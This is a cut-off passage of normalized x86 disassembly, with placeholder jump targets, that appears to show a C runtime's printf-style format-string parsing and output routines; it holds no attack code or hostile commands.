lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x40c ] eax
test eax eax
jns r-xdata
movzx eax [ edi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x428 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ edi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ edi + 0x2 ] 0x32
jne r-xdata
add edi 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x40c ] esi
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add edi 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add edi ecx
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax ecx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
cmp eax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x454 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
mov ecx [ ebp - 0x40c ]
or [ ebp - 0x408 ] 0x40
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
test ecx ecx
jns r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x41c ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x420 ] edx
sub eax ecx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_42578a
and [ ebp - 0x458 ] 0x0
pop ecx
mov edi [ ebp - 0x428 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x424 ]
mov [ ebp - 0x420 ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ecx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ecx
je r-xdata
cmp eax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x42c ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_4347c0
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp ecx eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebx ]
mov esi [ DecodePointer@IAT ]
add ebx 0x8
mov [ ebp - 0x470 ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x468 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x41c ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
call sub_439e5a
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x430 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ecx
jne r-xdata
cmp eax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x430 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x424 ] 0x1
cmp ecx 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov ecx eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x430 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_439e70
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x43c ] 0x0
add eax ecx
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x42c ]
lea eax [ ebp - 0x418 ]
call sub_4347c0
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x420 ]
jmp r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_43476a
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
lea esi [ ecx + 0x15d ]
push esi
call sub_42acad
mov edx [ ebp - 0x420 ]
pop ecx
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x418 ]
mov [ ebx ] eax
mov ax [ ebp - 0x418 ]
mov [ ebx ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push edi
push ebx
call sub_437480
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x420 ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x42c ]
lea esi [ ebp - 0x418 ]
call sub_43476a
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_43476a
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_427be0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_439e70
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_43476a
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_4353e7
mov edi edi
push ebp
mov ebp esp
push esi
mov si [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
movzx eax [ edi + 0x8 ]
cmp eax 0x70
je r-xdata
xor ecx ecx
cmp ax si
sete cl
mov eax ecx
cmp si 0x70
je r-xdata
cmp eax 0x73
je r-xdata
xor edx edx
inc edx
cmp eax 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp si 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp si 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov ecx [ ebp + 0x14 ]
shr eax 0x5
shr ecx 0x5
not eax
not ecx
xor eax ecx
test al 0x1
jne r-xdata
push 0x69
pop edi
push 0x64
pop edx
cmp ax dx
je r-xdata
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp ax di
je r-xdata
xor eax eax
inc eax
cmp si di
je r-xdata
cmp ax dx
je r-xdata
cmp eax 0x6f
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp si 0x6f
je r-xdata
cmp ax di
je r-xdata
cmp eax 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp si 0x75
je r-xdata
cmp eax 0x6f
je r-xdata
cmp eax 0x78
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp si 0x78
je r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x58
je r-xdata
cmp si 0x58
je r-xdata
cmp eax 0x78
je r-xdata
cmp si dx
je r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x58
je r-xdata
cmp si di
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp si 0x6f
je r-xdata
cmp si dx
je r-xdata
cmp si 0x75
je r-xdata
cmp si 0x78
je r-xdata
cmp si 0x58
jne r-xdata
sub_435532
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_438e36
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_435561
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_435532
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_435588
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_435532
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_435532
pop ecx
sub_4355ef
mov edi edi
push ebp
mov ebp esp
sub esp 0xad0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0xa70 ]
mov [ ebp - 0xaa0 ] ebx
mov [ ebp - 0xa4c ] eax
mov [ ebp - 0xab0 ] edi
mov [ ebp - 0xa48 ] edi
mov [ ebp - 0xa98 ] edi
mov [ ebp - 0xab8 ] edi
mov [ ebp - 0xa9c ] edi
call sub_42b774
or [ ebp - 0xa54 ] 0xffffffff
mov [ ebp - 0xa94 ] edi
call sub_4268f3
mov [ ebp - 0xac4 ] eax
cmp ebx edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0xa64 ] 0x0
je r-xdata
mov [ ebp - 0xa74 ] edi
mov [ ebp - 0xad0 ] esi
mov [ ebp - 0xa5c ] edi
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0xa68 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ebx [ esi ]
or [ ebp - 0xa90 ] 0xffffffff
or [ ebp - 0xa78 ] 0xffffffff
or [ ebp - 0xa54 ] 0xffffffff
mov [ ebp - 0xa88 ] edi
mov [ ebp - 0xaac ] edi
mov [ ebp - 0xab4 ] edi
mov [ ebp - 0xa84 ] edi
mov [ ebp - 0xa50 ] edi
mov [ ebp - 0xa7c ] esi
mov [ ebp - 0xa58 ] ebx
cmp bx di
je r-xdata
cmp [ ebp - 0xa54 ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
inc [ ebp - 0xa5c ]
cmp [ ebp - 0xa5c ] 0x2
jge r-xdata
jmp r-xdata
cmp [ ebp - 0xa64 ] 0x0
je r-xdata
mov esi [ ebp - 0xad0 ]
xor edi edi
jmp r-xdata
push 0x2
pop edx
add esi edx
cmp [ ebp - 0xa74 ] 0x0
mov [ ebp - 0xa7c ] esi
jl r-xdata
mov eax [ ebp - 0xa74 ]
mov eax [ ebp - 0xa68 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xa5c ] 0x1
jne r-xdata
cmp [ ebp - 0xaac ] 0x0
je r-xdata
lea eax [ ebx - 0x20 ]
cmp ax 0x58
ja r-xdata
cmp [ ebp - 0xa54 ] 0x1
jne r-xdata
cmp [ ebp - 0xaac ] 0x7
jne r-xdata
xor eax eax
movzx eax bx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
cmp edi 0x8
je r-xdata
cmp [ esi ] 0x25
je r-xdata
mov ecx [ ebp - 0xaac ]
imul eax eax 0x9
movzx edi [ eax + ecx + r--data ]
shr edi 0x4
mov [ ebp - 0xaac ] edi
cmp edi 0x1
jne r-xdata
xor edi edi
cmp [ ebp - 0xa90 ] edi
jl r-xdata
cmp edi 0x7
ja r-xdata
mov ecx [ ebp - 0xa78 ]
jmp [ edi * 4 + jump_table_4368a3 ]
cmp [ ebp - 0xa54 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xa4c ]
lea esi [ ebp - 0x640 ]
mov esi [ ebp - 0xa7c ]
movzx eax [ esi ]
mov [ ebp - 0xa58 ] eax
test ax ax
jne r-xdata
jmp r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
xor eax eax
or [ ebp - 0xa50 ] 0xffffffff
mov [ ebp - 0xac0 ] eax
mov [ ebp - 0xab8 ] eax
mov [ ebp - 0xa84 ] eax
mov [ ebp - 0xa98 ] eax
mov [ ebp - 0xa48 ] eax
mov [ ebp - 0xa9c ] eax
jmp r-xdata
movzx eax bx
sub eax 0x20
je r-xdata
cmp bx 0x2a
jne r-xdata
and [ ebp - 0xa50 ] 0x0
jmp r-xdata
cmp bx 0x2a
jne r-xdata
movzx eax bx
cmp eax 0x49
je r-xdata
movzx eax bx
cmp eax 0x64
jg r-xdata
cmp [ ebp - 0xa54 ] 0x1
jne r-xdata
push 0xa
lea eax [ ebp - 0xa94 ]
push eax
push esi
call sub_43c627
add esp 0xc
test eax eax
jle r-xdata
mov [ esi ] eax
add eax 0x4
dec ecx
je r-xdata
mov ebx [ ebp - 0xa58 ]
cmp [ ebp - 0xa5c ] 0x1
jne r-xdata
cmp [ ebp - 0xa54 ] 0x1
je r-xdata
or [ ebp - 0xa48 ] edx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0xa84 ]
imul eax eax 0xa
movzx ecx bx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0xa84 ] eax
jmp r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa50 ]
imul eax eax 0xa
movzx ecx bx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0xa50 ] eax
jmp r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
push 0xa
lea eax [ ebp - 0xa94 ]
push eax
push esi
call sub_43c627
mov ecx [ ebp - 0xa94 ]
add esp 0xc
dec eax
cmp [ ebp - 0xa5c ] 0x0
lea edx [ ecx + 0x2 ]
mov [ ebp - 0xa78 ] eax
mov [ ebp - 0xa7c ] edx
jne r-xdata
and [ ebp - 0xa54 ] 0x0
push 0x2
pop edx
mov eax [ ebp - 0xa94 ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ esi - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
mov eax [ ebp - 0xaa0 ]
push ebx
lea esi [ ebp - 0xa74 ]
mov [ ebp - 0xa9c ] 0x1
call sub_435532
jmp r-xdata
cmp [ ebp - 0xa54 ] 0xffffffff
jne r-xdata
or [ ebp - 0xa48 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
push 0xa
lea eax [ ebp - 0xa94 ]
push eax
push esi
call sub_43c627
mov ecx [ ebp - 0xa94 ]
add esp 0xc
dec eax
cmp [ ebp - 0xa5c ] 0x0
lea edx [ ecx + 0x2 ]
mov [ ebp - 0xa7c ] edx
jne r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
push 0xa
lea eax [ ebp - 0xa94 ]
push eax
push esi
call sub_43c627
mov ecx [ ebp - 0xa94 ]
add esp 0xc
dec eax
cmp [ ebp - 0xa5c ] 0x0
lea edx [ ecx + 0x2 ]
mov [ ebp - 0xa7c ] edx
je r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0xa48 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0xa48 ] 0x40
cmp eax 0x53
jg r-xdata
push 0x2
mov esi edx
pop edx
test eax eax
js r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
mov [ esi ] eax
add eax 0x8
jmp r-xdata
dec ecx
je r-xdata
pop ecx
jmp r-xdata
or [ ebp - 0xa48 ] 0x1
jmp r-xdata
sub eax edx
je r-xdata
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
mov eax [ eax ]
test eax eax
js r-xdata
mov [ ebp - 0xa84 ] eax
test eax eax
jge r-xdata
add eax eax
mov eax [ ebp + eax * 8 - 0x640 ]
mov eax [ eax ]
mov [ ebp - 0xa50 ] eax
test eax eax
jge r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0xa48 ] 0x8000
mov [ ebp - 0xa7c ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0xa50 ]
cmp ebx 0xffffffff
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp - 0xa50 ] 0x8
cmp eax 0x65
jl r-xdata
test ebx 0x1000
je r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
sub eax 0x58
je r-xdata
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0xa54 ] 0x1
jmp r-xdata
push 0x640
lea eax [ ebp - 0x644 ]
push 0x0
push eax
call sub_4338e0
add esp 0xc
mov [ ebp - 0xa4c ] eax
dec ecx
je r-xdata
or [ ebp - 0xa48 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0xa48 ] 0x4
neg [ ebp - 0xa84 ]
jmp r-xdata
cmp [ ecx ] 0x24
jne r-xdata
or [ ebp - 0xa50 ] 0xffffffff
jmp r-xdata
or [ ebp - 0xa48 ] 0x10000
jmp r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0xa48 ] 0xffff7fff
mov [ ebp - 0xa7c ] esi
jmp r-xdata
or [ ebp - 0xa48 ] 0x10
jmp r-xdata
add esi edx
or [ ebp - 0xa48 ] 0x1000
mov [ ebp - 0xa7c ] esi
jmp r-xdata
or [ ebp - 0xa48 ] 0x800
jmp r-xdata
xor edi edi
cmp [ ebp - 0xa54 ] edi
jne r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0xa80 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0xa48 ] 0x80
mov [ ebp - 0xa80 ] 0x10
je r-xdata
cmp [ ebp - 0xa54 ] 0x1
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x20
je r-xdata
cmp [ ebp - 0xa54 ] 0x0
je r-xdata
cmp ecx 0x63
ja r-xdata
mov ecx [ ebp - 0xa4c ]
add ecx 0x8
mov [ ebp - 0xa4c ] ecx
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
jmp r-xdata
mov [ ebp - 0xab0 ] 0x7
jmp r-xdata
sub eax edx
je r-xdata
test [ ebp - 0xa48 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
cmp eax 0x64
jge r-xdata
dec ecx
dec ecx
jne r-xdata
or [ ebp - 0xa48 ] 0x8
jmp r-xdata
cmp [ ebp - 0xa78 ] 0x64
jge r-xdata
cmp eax 0x6f
je r-xdata
cmp ecx 0x63
ja r-xdata
add [ ebp - 0xa4c ] 0x4
mov eax [ ebp - 0xa4c ]
mov eax [ eax - 0x4 ]
jmp r-xdata
mov [ ebp - 0xab0 ] 0x27
mov ebx [ ebp - 0xa48 ]
push 0x30
pop eax
mov [ ebp - 0xaa8 ] ax
mov eax [ ebp - 0xab0 ]
add eax 0x51
mov [ ebp - 0xaa6 ] ax
mov [ ebp - 0xa98 ] edx
jmp r-xdata
cmp [ ebp - 0xab8 ] 0x0
jne r-xdata
cmp [ ebp - 0xa5c ] 0x0
je r-xdata
or [ ebp - 0xa48 ] 0x40
cmp [ ebp - 0xa54 ] 0x1
jne r-xdata
cmp eax 0x69
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
cmp ecx 0x63
ja r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
test bl 0x40
je r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0xa48 ] 0x20
add ebx 0x20
mov [ ebp - 0xac0 ] 0x1
mov [ ebp - 0xa58 ] ebx
sub eax edx
je r-xdata
cmp eax [ ebp - 0xa90 ]
jle r-xdata
mov [ esi ] eax
lea eax [ ebp - 0xa4c ]
push eax
call sub_43b12c
mov eax [ ebp - 0xa4c ]
pop ecx
jmp r-xdata
cmp eax [ ebp - 0xa90 ]
jle r-xdata
cmp eax 0x75
je r-xdata
cmp [ ebp - 0xa5c ] edi
jne r-xdata
test [ ebp - 0xa48 ] 0x20
mov [ ebp - 0xa60 ] eax
je r-xdata
cmp [ ebp - 0xab4 ] 0x0
je r-xdata
mov eax [ ebp - 0xa48 ]
test al 0x40
je r-xdata
cmp [ ebp - 0xa50 ] 0x0
lea edi [ ebp - 0xa44 ]
mov eax 0x200
mov [ ebp - 0xa60 ] edi
mov [ ebp - 0xa80 ] eax
jge r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
cmp eax 0x6e
je r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
cmp [ ebp - 0xa54 ] 0x0
jne r-xdata
cmp [ ebp - 0xa5c ] 0x0
jne r-xdata
mov eax [ ebp - 0xa78 ]
add eax eax
